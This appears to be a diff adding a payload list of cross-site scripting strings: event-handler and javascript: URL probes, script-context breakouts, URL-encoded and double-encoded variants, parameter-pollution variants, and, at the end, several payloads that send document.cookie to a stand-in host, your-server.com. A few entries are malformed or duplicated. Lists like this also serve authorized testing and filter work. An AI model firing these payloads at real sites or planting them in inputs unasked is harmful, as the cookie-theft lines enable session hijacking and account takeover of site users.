@@ -1,0 +1,109 @@
+<svg/onload=alert(1)>
+<iframe src="javascript:alert(1)">
+<svg><script>alert(1)</script>
+<details open ontoggle=alert(1)>
+<object data="javascript:alert(1)">
+<math><mtext><script>alert(1)</script></mtext></math>
+<svg/onload=alert(1)//
+<svg/onload=alert&lpar;1&rpar;
+<video poster=javascript:alert(1)//>
+<isindex type=image src=1 onerror=alert(1)>
+" onmouseover="alert(1)
+" src="javascript:alert(1)"
+' style="color:red" onmouseover="alert(1)"
+<img src=x onerror=alert(1)>
+<svg><animate onbegin=alert(1)>
+" autofocus onfocus="alert(1)"
+<marquee onstart=alert(1)>
+<details ontoggle=alert(1)>
+<input type="image" src="x" onerror="alert(1)">
+<a href="javascript:alert(1)">click</a>
+{"data": "</script><script>alert(1)</script>"}
+</script><script>alert(1)</script>
+");alert(1);//
+';alert(1);// 
+";alert(1);//
+'"><script>alert(1)</script>
+"-alert(1)-"
+');alert(1)//
+"};alert(1);{
+alert(1)//"}}
+<svg><animate onbegin=alert(1)>
+<svg><set attributeName="onload" to="alert(1)"/>
+<style>*{x:expression(alert(1))}</style>
+<marquee onstart="alert(1)">
+<svg><a xlink:href="javascript:alert(1)">X</a></svg>
+<svg/onload=alert(1)>
+<div style="width:expression(alert(1))">
+<math href="javascript:alert(1)">Click</math>
+<iframe src="javascript:alert(1)"></iframe>
+<body onpageshow=alert(1)>
+%253Cscript%253Ealert(1)%253C%252Fscript%253E
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Csvg%3E%3Canimate%20onbegin%3D%22alert(1)%22%2F%3E%3C%2Fsvg%3E
+%3Cimg%20src=x%20onerror=alert(1)%3E
+%u003Cscript%u003Ealert(1)%u003C/script%u003E
+%3Cimg%20src=x%20onerror%3D%22alert(1)%22%3E
+%3Ciframe%20src%3Djavascript%3Aalert%281%29%3E
+%253Csvg%253E%253Cset%2520attributeName%253D%2522onload%2522%2520to%253D%2522alert%281%29%2522%253E
+%3Cmarquee%20onstart%3Dalert%281%29%3E
+%3Cstyle%3E%20%7Bcolor%3Aexpression(alert(1))%7D%20%3C/style%3E
+?param=<script>&param=>alert(1)</script>
+?param=<img&param=src=x&param=onerror=alert(1)>
+?param="><script>alert(1)</script>
+?param=</script><script>alert(1)</script>
+?param=<svg&param=onload=alert(1)>
+?param1=<script>&param2=alert(1)</script>
+?param=%3Cscript%3Ealert(1)%3C%2Fscript%3E&param=<svg>
+?xss="<img src=x onerror=alert(1)>"&xss="<script>alert(1)</script>"
+?param=<marquee&param=onstart=alert(1)>
+?param="><marquee onstart=alert(1)>
+<input1: </script><script>
+<input2: alert(1)</script>
+<part1: </script><img src=x>
+<part2: onerror=alert(1)>
+<svg><a 
+xlink:href="javascript:
+alert(1)">
+</svg><a xlink
+:href="javascript:alert(1)">
+<param: <div style="colo
+r:expression(alert(1))">
+<first: <svg><set attrib
+uteName="onload" to="alert(1)"/>
+<js>":';alert(1);//</js>
+<svg><animate
+ onbegin=alert(1)/>
+'-alert(1)//
+"alert(1)//
+" alert(1) //
+");alert(1);//
+';alert(1);//
+";alert(1);//
+</script><script>alert(1)</script>
+');};alert(1);//
+";windowfind(alert)//
+<math href="javascript:alert(1)">Click me</math>
+<xml id="xss"><a href="javascript:alert(1)">X</a></xml>
+<math><mtext><script>alert(1)</script></mtext></math>
+<xsl:template match="/">alert(1)</xsl:template>
+<xml><i><b><a href="javascript:alert(1)">Click</a></b></i></xml>
+<math><mtext><style>*{x:expression(alert(1))}</style></mtext></math>
+<xml><load href="javascript:alert(1)">X</load></xml>
+<math><set attributeName="onload" to="alert(1)"/>
+<object data="javascript:alert(1)">
+<xml><input type=image src=x onerror=alert(1)>
+<img src="https://your-server.com/?c="+document.cookie>
+<svg onload="fetch('https://your-server.com/' + document.cookie)">
+<iframe src="javascript:fetch('https://your-server.com/?c='+document.cookie)">
+<script>fetch('https://your-server.com/' + document.cookie)</script>
+<svg><animate onbegin="fetch('https://your-server.com/'+document.cookie)"/>
+<marquee onstart="fetch('https://your-server.com/'+document.cookie)">
+<iframe srcdoc="<script>fetch('https://your-server.com/'+document.cookie)</script>">
+<object data="javascript:fetch('https://your-server.com/'+document.cookie)">
+<video poster="javascript:fetch('https://your-server.com/'+document.cookie)"></video>
+<img src=x onerror="fetch('https://your-server.com/?c='+document.cookie)">
+
+
+
+
